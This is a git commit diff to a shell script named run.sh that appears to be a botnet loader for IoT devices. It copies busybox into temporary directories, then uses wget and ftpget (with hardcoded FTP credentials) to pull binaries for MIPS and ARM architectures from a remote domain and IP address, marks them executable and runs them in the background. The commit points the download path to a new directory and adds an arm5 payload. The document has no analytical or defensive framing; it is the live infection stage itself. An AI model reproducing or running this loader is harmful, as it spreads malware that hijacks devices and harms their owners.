c3a2739d271c498c422260855e531ae4c9ad0dde
urBenm4 <138570858+urBenm4@users.noreply.github.com>
2026-07-13 12:05:30 +0400

    daw

--- owo/old/run.sh
+++ owo/old/run.sh
@@ -3,27 +3,32 @@ ulimit -n 65535 2>/dev/null || true
 cp /bin/busybox /tmp/ || cp /bin/busybox /var/tmp/ || cp /bin/busybox /var/run/ || cp /bin/busybox /run/ || cp /bin/busybox /dev/shm/ || cp /bin/busybox /mnt/ || cp /bin/busybox /root/ || cp /bin/busybox /opt/ || cp /bin/busybox /var/ || cp /bin/busybox /home/ || true
 cd /tmp 2>/dev/null || cd /dev/shm 2>/dev/null || cd /
 
-busybox wget http://store.risesmp.cc/wow/ntb.mips
+busybox wget http://store.risesmp.cc/owo/ntb.mips
 busybox ftpget -u abc -p abcdefghij 94.130.108.110 ntb.mips ntb.mips
 chmod 777 ntb.mips
 ./ntb.mips universal &
 
-busybox wget http://store.risesmp.cc/wow/ntb.mipsel
+busybox wget http://store.risesmp.cc/owo/ntb.mipsel
 busybox ftpget -u abc -p abcdefghij 94.130.108.110 ntb.mipsel ntb.mipsel
 chmod 777 ntb.mipsel
 ./ntb.mipsel universal &
 
-busybox wget http://store.risesmp.cc/wow/ntb.arm64
+busybox wget http://store.risesmp.cc/owo/ntb.arm5
+busybox ftpget -u abc -p abcdefghij 94.130.108.110 ntb.arm5 ntb.arm5
+chmod 777 ntb.arm5
+./ntb.arm5 universal &
+
+busybox wget http://store.risesmp.cc/owo/ntb.arm64
 busybox ftpget -u abc -p abcdefghij 94.130.108.110 ntb.arm64 ntb.arm64
 chmod 777 ntb.arm64
 ./ntb.arm64 universal &
 
-busybox wget http://store.risesmp.cc/wow/ntb.arm6
+busybox wget http://store.risesmp.cc/owo/ntb.arm6
 busybox ftpget -u abc -p abcdefghij 94.130.108.110 ntb.arm6 ntb.arm6
 chmod 777 ntb.arm6
 ./ntb.arm6 universal &
 
-busybox wget http://store.risesmp.cc/wow/ntb.arm7
+busybox wget http://store.risesmp.cc/owo/ntb.arm7
 busybox ftpget -u abc -p abcdefghij 94.130.108.110 ntb.arm7 ntb.arm7
 chmod 777 ntb.arm7
 ./ntb.arm7 universal &
